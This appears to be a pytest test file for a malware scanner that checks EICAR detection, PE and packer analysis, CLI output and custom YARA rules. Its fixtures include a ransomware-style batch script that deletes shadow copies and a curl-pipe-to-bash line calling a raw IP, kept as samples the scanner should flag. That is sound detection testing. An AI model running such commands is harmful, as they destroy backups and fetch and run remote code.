import json

import pytest

from zscan import analysis
from zscan.cli import main
from zscan.scanner import Scanner

from samples import EICAR, benign_pe, packed_like_pe


@pytest.fixture(scope="module")
def scanner():
    return Scanner()


def write(tmp_path, name, data):
    p = tmp_path / name
    p.write_bytes(data)
    return p


def titles(rep):
    return [f.title for f in rep.findings]


def test_entropy_bounds():
    assert analysis.shannon_entropy(b"") == 0
    assert analysis.shannon_entropy(b"aaaa") == 0
    assert analysis.shannon_entropy(bytes(range(256))) == pytest.approx(8.0)


def test_eicar_is_malicious(scanner, tmp_path):
    rep = scanner.scan_file(write(tmp_path, "eicar.com", EICAR))
    assert rep.verdict == "malicious"
    assert "YARA: EICAR_Test_File" in titles(rep)
    assert rep.hashes["md5"] == "44d88612fea8a8f36de82e1278abb02f"  # well-known EICAR MD5


def test_plain_text_is_clean(scanner, tmp_path):
    rep = scanner.scan_file(write(tmp_path, "notes.txt", b"Shopping list: eggs, milk, bread.\n"))
    assert rep.verdict == "clean"
    assert rep.file_type == "text"
    assert rep.findings == []


def test_suspicious_script(scanner, tmp_path):
    script = (b"@echo off\r\nvssadmin delete shadows /all /quiet\r\n"
              b"wmic shadowcopy delete\r\n"
              b"echo Your files have been encrypted > README.txt\r\n")
    rep = scanner.scan_file(write(tmp_path, "x.bat", script))
    assert rep.verdict == "malicious"
    assert "YARA: Ransomware_Commands" in titles(rep)
    assert "Ransom note wording" in titles(rep)


def test_benign_pe(scanner, tmp_path):
    rep = scanner.scan_file(write(tmp_path, "ok.exe", benign_pe()))
    assert rep.file_type == "pe"
    assert rep.verdict == "clean", titles(rep)


def test_packed_like_pe(scanner, tmp_path):
    rep = scanner.scan_file(write(tmp_path, "packed.exe", packed_like_pe()))
    t = titles(rep)
    assert "Packer section name 'UPX1'" in t
    assert "Section 'UPX1' is writable and executable" in t
    assert any(x.startswith("High-entropy section") for x in t)
    assert "YARA: UPX_Packed" in t
    assert rep.verdict in ("suspicious", "malicious")


def test_truncated_pe(scanner, tmp_path):
    rep = scanner.scan_file(write(tmp_path, "broken.exe", b"MZ" + b"\x00" * 10))
    assert "Malformed PE header" in titles(rep)


def test_directory_scan_and_json(tmp_path, capsys):
    write(tmp_path, "a.txt", b"hello")
    sub = tmp_path / "sub"
    sub.mkdir()
    write(sub, "eicar.txt", EICAR)
    code = main([str(tmp_path), "--json"])
    out = json.loads(capsys.readouterr().out)
    assert code == 2
    assert out["summary"]["malicious"] == 1
    assert out["summary"]["clean"] == 1


def test_exit_code_clean(tmp_path, capsys):
    write(tmp_path, "a.txt", b"hello")
    assert main([str(tmp_path), "--no-color"]) == 0
    assert "1 clean" in capsys.readouterr().out


def test_custom_rules(tmp_path, capsys):
    rule = tmp_path / "r.yar"
    rule.write_text('rule Hello { meta: severity = 4 strings: $a = "hello" condition: $a }')
    target = write(tmp_path, "a.txt", b"hello")
    assert main([str(target), "-r", str(rule), "--no-color"]) == 1
    assert "YARA: Hello" in capsys.readouterr().out


def test_pipe_to_shell_from_raw_ip_is_suspicious(scanner, tmp_path):
    rep = scanner.scan_file(write(tmp_path, "setup.sh",
                                  b"#!/bin/sh\ncurl -s http://203.0.113.5:8080/x.sh | bash\n"))
    assert rep.verdict == "suspicious"
    assert "Pipe-to-shell download" in titles(rep)
